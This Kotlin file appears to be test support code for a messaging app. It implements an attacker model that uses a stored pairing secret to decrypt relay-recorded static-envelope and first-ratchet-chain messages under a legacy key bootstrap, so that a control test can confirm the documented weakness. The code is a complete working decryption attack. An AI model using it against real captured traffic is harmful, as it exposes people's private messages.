package com.vg.run

/**
 * The ATTACKER's program against the LEGACY pairing bootstrap — written from the
 * protocol description, not by calling the victim's [DoubleRatchet] or
 * [MessageManager]. Its only inputs are what the attacker holds: the stored
 * pairing secret (`contact.sharedSecret`, from an opened vault, a move bundle, or
 * a photo of both QR codes) and the bytes a hostile relay recorded.
 *
 * Every KDF label is spelled out here as a literal on purpose: if the production
 * labels ever change, this program stops working and the control test that uses
 * it fails, instead of silently following the change.
 *
 * Known limitation it documents (see docs/ratchet-bootstrap-plan.md §1 T1–T3):
 *  - static-envelope text: key = SHA-256(ss), AAD = SHA-256(key ‖ "message-aead");
 *  - the initiator's first ratchet chain: rk0 = HKDF(ss, "run-dr-init-v1"), the
 *    responder's first ratchet private key = HKDF(ss, "run-dr-bob-key-v1"), the
 *    initiator's ratchet public key is in the cleartext header — so the first
 *    DH output, and with it every message key of that chain, is computable.
 *
 * Kept generic (wire parsing, chain stepping, opening) so the v3 derivation
 * oracle can extend it with more candidate keys and labels.
 */
internal object LegacyBootstrapAttacker {

    const val LABEL_INIT = "run-dr-init-v1"
    const val LABEL_BOB_KEY = "run-dr-bob-key-v1"
    const val LABEL_ROOT = "run-dr-root-v1"
    const val LABEL_MSG = "run-dr-msg-v1"
    const val LABEL_STATIC_AAD = "message-aead"

    /** The 4-byte tag a ratchet relay blob starts with. */
    val RATCHET_MAGIC: ByteArray = "RAT1".encodeToByteArray()

    private val ZERO_SALT = ByteArray(32)

    /** One recorded ratchet wire, split along the public header layout. */
    class RatchetWire(
        /** The 40 header bytes exactly as sent (also the AEAD's associated data). */
        val header: ByteArray,
        val senderRatchetPub: ByteArray,
        val pn: Int,
        val n: Int,
        /** IV ‖ ciphertext ‖ tag. */
        val sealed: ByteArray,
    )

    private fun readIntBE(b: ByteArray, off: Int): Int =
        ((b[off].toInt() and 0xFF) shl 24) or ((b[off + 1].toInt() and 0xFF) shl 16) or
            ((b[off + 2].toInt() and 0xFF) shl 8) or (b[off + 3].toInt() and 0xFF)

    fun isRatchetBody(body: ByteArray): Boolean =
        body.size >= RATCHET_MAGIC.size && RATCHET_MAGIC.indices.all { body[it] == RATCHET_MAGIC[it] }

    /** A recorded relay body → its ratchet header + sealed part, or null (not a ratchet blob). */
    fun parseRatchetBody(body: ByteArray): RatchetWire? {
        if (!isRatchetBody(body)) return null
        val wire = body.copyOfRange(RATCHET_MAGIC.size, body.size)
        if (wire.size < 40 + 28) return null
        val header = wire.copyOfRange(0, 40)
        return RatchetWire(
            header = header,
            senderRatchetPub = header.copyOfRange(0, 32),
            pn = readIntBE(header, 32),
            n = readIntBE(header, 36),
            sealed = wire.copyOfRange(40, wire.size),
        )
    }

    /** The `"m"` field of a decrypted, padded envelope (the user's text), or null. */
    fun envelopeText(padded: ByteArray): String? = try {
        parseTopLevelJson(unpadMessage(padded).decodeToString())["m"]?.takeIf { it.isString }?.text
    } catch (_: Exception) {
        null
    }

    // --- static envelope -------------------------------------------------------

    fun staticKey(pairingSecret: ByteArray): ByteArray = sha256(pairingSecret)

    fun staticAad(staticKey: ByteArray): ByteArray = sha256(staticKey + LABEL_STATIC_AAD.encodeToByteArray())

    /** Opens one recorded static-envelope body with nothing but the pairing secret. */
    fun openStatic(pairingSecret: ByteArray, body: ByteArray): String? {
        if (isRatchetBody(body)) return null
        val key = staticKey(pairingSecret)
        return try {
            envelopeText(aesGcmDecrypt(ciphertext = body, key = key, associatedData = staticAad(key)))
        } catch (_: Exception) {
            null
        }
    }

    // --- legacy ratchet bootstrap ------------------------------------------------

    fun legacyRootKey(pairingSecret: ByteArray): ByteArray = hkdfSha256(pairingSecret, ZERO_SALT, LABEL_INIT.encodeToByteArray(), 32)

    fun legacyResponderRatchetPriv(pairingSecret: ByteArray): ByteArray =
        hkdfSha256(pairingSecret, ZERO_SALT, LABEL_BOB_KEY.encodeToByteArray(), 32)

    /** KDF_RK: (new root, chain key) from a root key and a DH output. */
    fun kdfRk(rootKey: ByteArray, dhOut: ByteArray): Pair<ByteArray, ByteArray> {
        val out = hkdfSha256(ikm = dhOut, salt = rootKey, info = LABEL_ROOT.encodeToByteArray(), length = 64)
        return out.copyOfRange(0, 32) to out.copyOfRange(32, 64)
    }

    /** KDF_CK: (next chain key, message key). */
    fun kdfCk(chainKey: ByteArray): Pair<ByteArray, ByteArray> =
        hmacSha256(chainKey, byteArrayOf(0x02)) to hmacSha256(chainKey, byteArrayOf(0x01))

    /** The message key at index [n] of the chain that starts at [chainKey]. */
    fun messageKeyAt(chainKey: ByteArray, n: Int): ByteArray {
        var ck = chainKey
        repeat(n) { ck = kdfCk(ck).first }
        return kdfCk(ck).second
    }

    /** Opens one ratchet wire with a candidate message key, or null. */
    fun openRatchetWire(messageKey: ByteArray, wire: RatchetWire): String? = try {
        val encKey = hkdfSha256(messageKey, ZERO_SALT, LABEL_MSG.encodeToByteArray(), 32)
        envelopeText(aesGcmDecrypt(ciphertext = wire.sealed, key = encKey, associatedData = wire.header))
    } catch (_: Exception) {
        null
    }

    /**
     * The initiator's first sending chain, rebuilt from the pairing secret: for each
     * recorded sender ratchet key, DH it against the responder's secret-derived
     * private key, run KDF_RK from the secret-derived root, and try that chain on
     * every wire carrying that key. Returns every text it opened, in wire order.
     */
    fun openInitiatorFirstChain(pairingSecret: ByteArray, bodies: List<ByteArray>): List<String> {
        val wires = bodies.mapNotNull { parseRatchetBody(it) }
        val bobPriv = legacyResponderRatchetPriv(pairingSecret)
        val rk0 = legacyRootKey(pairingSecret)
        val chainBySender = mutableMapOf<String, ByteArray>()
        val opened = mutableListOf<String>()
        for (w in wires) {
            val senderHex = w.senderRatchetPub.joinToString("") { (it.toInt() and 0xFF).toString(16).padStart(2, '0') }
            val ck = chainBySender.getOrPut(senderHex) {
                kdfRk(rk0, x25519Ecdh(bobPriv, w.senderRatchetPub)).second
            }
            openRatchetWire(messageKeyAt(ck, w.n), w)?.let { opened.add(it) }
        }
        return opened
    }
}
